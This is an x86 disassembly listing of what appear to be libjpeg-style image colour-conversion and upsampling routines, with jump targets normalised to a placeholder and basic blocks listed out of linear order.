xor ecx ecx
mov cl [ eax ]
imul ecx ecx 0x3
mov edx [ ebp - 0xc ]
xor eax eax
mov al [ edx ]
add ecx eax
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x14 ]
imul eax eax 0x3
mov ecx [ ebp - 0x18 ]
lea edx [ eax + ecx + 0x8 ]
sar edx 0x4
mov eax [ ebp - 0x10 ]
mov [ eax ] dl
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x14 ]
imul edx edx 0x3
mov eax [ ebp - 0x1c ]
lea ecx [ edx + eax + 0x7 ]
sar ecx 0x4
mov edx [ ebp - 0x10 ]
mov [ edx ] cl
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov edx [ ebp - 0x2c ]
add edx 0x1
mov [ ebp - 0x2c ] edx
mov edx [ ebp - 0x20 ]
sub edx 0x1
mov [ ebp - 0x20 ] edx
sub_426460
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
push 0x18
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x1a4 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_4318b0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0xc ]
sub edx 0x1
mov [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x4
ja r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x24 ] 0x1
jge r-xdata
mov eax [ ebp - 0xc ]
jmp [ eax * 4 + jump_table_426743 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x10 ] 0x1
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0xa
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x24 ] 0x1
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x24 ] 0x3
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x24 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x64 ] 0x1
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x28 ] 0x1
je r-xdata
cmp [ ebp - 0x10 ] 0x2
je r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0xa
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0xa
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0xa
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_426ab0
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x28 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x64 ] 0x3
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x28 ] 0x3
jne r-xdata
cmp [ ebp - 0x10 ] 0x4
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx + 0x24 ]
jge r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x1b
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x28 ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_426890
mov eax [ ebp + 0x8 ]
push eax
call sub_426760
add esp 0x4
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] 0x4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x28 ] 0x5
jne r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0x54
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc4 ]
mov [ eax + ecx + 0x30 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0x4a ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x28 ] 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_426af0
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x28 ] 0x4
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] sub_426b90
mov edx [ ebp + 0x8 ]
push edx
call sub_426760
add esp 0x4
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x2c ]
cmp eax [ edx + 0x28 ]
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov [ edx + 0x68 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x68 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x1b
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x1b
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] sub_4269f0
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
mov [ edx + 0x64 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_4269f0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
mov [ ecx + 0x2c ] eax
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x2c ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_4269f0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x1b
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
sub_426760
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a4 ]
mov [ ebp - 0x4 ] ecx
push 0x400
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx ]
add esp 0xc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
push 0x400
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] eax
push 0x400
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx ]
add esp 0xc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] eax
push 0x400
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x14 ] eax
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0xc ] 0xffffff80
jmp r-xdata
cmp [ ebp - 0x8 ] 0xff
jg r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
imul ecx ecx 0x166e9
add ecx 0x8000
sar ecx 0x10
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax + edx * 4 ] ecx
mov eax [ ebp - 0xc ]
imul eax eax 0x1c5a2
add eax 0x8000
sar eax 0x10
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ edx + ecx * 4 ] eax
mov edx [ ebp - 0xc ]
imul edx edx 0xffff492e
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ecx + eax * 4 ] edx
mov ecx [ ebp - 0xc ]
imul ecx ecx 0xffffa7e6
add ecx 0x8000
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ eax + edx * 4 ] ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
sub_426890
push ebp
mov ebp esp
sub esp 0x7c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a4 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x120 ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x38 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x3c ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ ebp + 0x10 ]
mov eax [ ecx + edx * 4 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp + 0x10 ]
mov ecx [ edx + eax * 4 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ eax + ecx * 4 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp + 0x10 ]
add eax 0x1
mov [ ebp + 0x10 ] eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0x14 ]
add eax 0x4
mov [ ebp + 0x14 ] eax
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x24 ]
cmp edx [ ebp - 0x28 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x24 ]
xor ecx ecx
mov cl [ eax ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x24 ]
xor eax eax
mov al [ edx ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x20 ]
add ecx [ ebp - 0x24 ]
xor edx edx
mov dl [ ecx ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x8 ]
add edx [ ecx + eax * 4 ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x2c ]
mov dl [ ecx + edx ]
mov [ eax ] dl
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x3c ]
mov edx [ ecx + eax * 4 ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x38 ]
add edx [ ecx + eax * 4 ]
sar edx 0x10
mov eax [ ebp - 0x8 ]
add eax edx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x2c ]
mov al [ edx + eax ]
mov [ ecx + 0x1 ] al
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x8 ]
add eax [ edx + ecx * 4 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x2c ]
mov al [ edx + eax ]
mov [ ecx + 0x2 ] al
mov ecx [ ebp - 0x14 ]
add ecx 0x3
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov edx [ ebp + 0x18 ]
sub edx 0x1
mov [ ebp + 0x18 ] edx
cmp [ ebp + 0x18 ] 0x0
jl r-xdata
mov ecx [ ebp - 0x24 ]
add ecx 0x1
mov [ ebp - 0x24 ] ecx
sub_4269f0
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x5c ]
mov [ ebp - 0x14 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp + 0x10 ]
add eax 0x1
mov [ ebp + 0x10 ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x4
mov [ ebp + 0x14 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0xc ]
mov eax [ edx + ecx * 4 ]
mov ecx [ ebp + 0x10 ]
mov edx [ eax + ecx * 4 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
add ecx [ ebp - 0x18 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x14 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov ecx [ ebp + 0x18 ]
sub ecx 0x1
mov [ ebp + 0x18 ] ecx
cmp [ ebp + 0x18 ] 0x0
jl r-xdata
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov al [ edx ]
mov [ ecx ] al
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x10 ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0xc ]
sub eax 0x1
mov [ ebp - 0xc ] eax
sub_426ab0
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x5c ]
push ecx
mov edx [ ebp + 0x18 ]
push edx
push 0x0
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx ]
push eax
call sub_420cc0
add esp 0x18
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426af0
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x5c ]
mov [ ebp - 0x10 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ ebp + 0x10 ]
mov eax [ ecx + edx * 4 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x10 ]
add ecx 0x1
mov [ ebp + 0x10 ] ecx
mov edx [ ebp + 0x14 ]
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x4
mov [ ebp + 0x14 ] ecx
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov al [ ecx ]
mov [ edx + 0x2 ] al
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov al [ edx + 0x2 ]
mov [ ecx + 0x1 ] al
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov al [ edx + 0x1 ]
mov [ ecx ] al
mov ecx [ ebp - 0x8 ]
add ecx 0x3
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov edx [ ebp + 0x18 ]
sub edx 0x1
mov [ ebp + 0x18 ] edx
cmp [ ebp + 0x18 ] 0x0
jl r-xdata
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
sub_426b90
push ebp
mov ebp esp
sub esp 0x80
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a4 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x5c ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x120 ]
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x34 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
mov [ ebp - 0x38 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x3c ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x40 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ ebp + 0x10 ]
mov eax [ ecx + edx * 4 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp + 0x10 ]
mov ecx [ edx + eax * 4 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ eax + ecx * 4 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0xc ]
mov edx [ ebp + 0x10 ]
mov eax [ ecx + edx * 4 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp + 0x10 ]
add ecx 0x1
mov [ ebp + 0x10 ] ecx
mov edx [ ebp + 0x14 ]
mov eax [ edx ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x4
mov [ ebp + 0x14 ] ecx
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x28 ]
cmp eax [ ebp - 0x2c ]
jae r-xdata
jmp r-xdata
mov ecx [ ebp - 0x18 ]
add ecx [ ebp - 0x28 ]
xor edx edx
mov dl [ ecx ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x28 ]
xor ecx ecx
mov cl [ eax ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x20 ]
add edx [ ebp - 0x28 ]
xor eax eax
mov al [ edx ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x8 ]
add eax [ edx + ecx * 4 ]
mov ecx 0xff
sub ecx eax
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x30 ]
mov cl [ eax + ecx ]
mov [ edx ] cl
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + edx * 4 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x3c ]
add ecx [ eax + edx * 4 ]
sar ecx 0x10
mov edx [ ebp - 0x8 ]
add edx ecx
mov eax 0xff
sub eax edx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x30 ]
mov al [ edx + eax ]
mov [ ecx + 0x1 ] al
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x8 ]
add eax [ edx + ecx * 4 ]
mov ecx 0xff
sub ecx eax
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x30 ]
mov cl [ eax + ecx ]
mov [ edx + 0x2 ] cl
mov edx [ ebp - 0x24 ]
add edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
mov cl [ edx ]
mov [ eax + 0x3 ] cl
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov edx [ ebp + 0x18 ]
sub edx 0x1
mov [ ebp + 0x18 ] edx
cmp [ ebp + 0x18 ] 0x0
jl r-xdata
mov edx [ ebp - 0x28 ]
add edx 0x1
mov [ ebp - 0x28 ] edx
sub_426d20
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push 0x30
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x1a0 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_426f10
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x5c ]
imul eax [ edx + 0x64 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x28 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x114 ] 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_427060
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] sub_4270c0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x20 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_426f40
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] sub_427300
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x28 ]
push eax
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
call [ eax + 0x4 ]
add esp 0xc
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x20 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_426de0
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426de0
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a0 ]
mov [ ebp - 0x4 ] ecx
push 0x400
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx ]
add esp 0xc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] eax
push 0x400
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x14 ] eax
push 0x400
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx ]
add esp 0xc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
push 0x400
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x1c ] eax
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0xc ] 0xffffff80
jmp r-xdata
cmp [ ebp - 0x8 ] 0xff
jg r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
imul ecx ecx 0x166e9
add ecx 0x8000
sar ecx 0x10
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov [ eax + edx * 4 ] ecx
mov eax [ ebp - 0xc ]
imul eax eax 0x1c5a2
add eax 0x8000
sar eax 0x10
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x14 ]
mov ecx [ ebp - 0x8 ]
mov [ edx + ecx * 4 ] eax
mov edx [ ebp - 0xc ]
imul edx edx 0xffff492e
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov [ ecx + eax * 4 ] edx
mov ecx [ ebp - 0xc ]
imul ecx ecx 0xffffa7e6
add ecx 0x8000
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x1c ]
mov edx [ ebp - 0x8 ]
mov [ eax + edx * 4 ] ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
sub_426f10
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a0 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x24 ] 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x60 ]
mov [ eax + 0x2c ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426f40
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a0 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx + 0x24 ]
test eax eax
je r-xdata
mov [ ebp - 0x10 ] 0x2
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
cmp ecx [ eax + 0x2c ]
jbe r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x28 ]
push edx
push 0x1
push 0x0
mov eax [ ebp + 0x1c ]
mov ecx [ eax ]
mov edx [ ebp + 0x18 ]
lea eax [ edx + ecx * 4 ]
push eax
push 0x0
mov ecx [ ebp - 0x4 ]
add ecx 0x20
push ecx
call sub_420cc0
add esp 0x18
mov [ ebp - 0x10 ] 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x24 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x20 ]
sub edx [ ecx ]
mov [ ebp + 0x20 ] edx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0x20 ]
jbe r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x2c ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0x1c ]
mov edx [ ecx ]
add edx [ ebp - 0x10 ]
mov eax [ ebp + 0x1c ]
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x2c ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] edx
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x24 ]
test edx edx
jne r-xdata
mov edx [ ebp + 0x1c ]
mov eax [ edx ]
mov ecx [ ebp + 0x18 ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0xc ] edx
cmp [ ebp - 0x10 ] 0x1
jbe r-xdata
mov ecx [ ebp + 0x20 ]
mov [ ebp - 0x10 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
add ecx 0x1
mov edx [ ebp + 0x10 ]
mov [ edx ] ecx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0x1c ]
mov ecx [ eax ]
mov edx [ ebp + 0x18 ]
mov eax [ edx + ecx * 4 + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
lea ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x4 ]
call [ eax + 0xc ]
add esp 0x10
sub_427060
push ebp
mov ebp esp
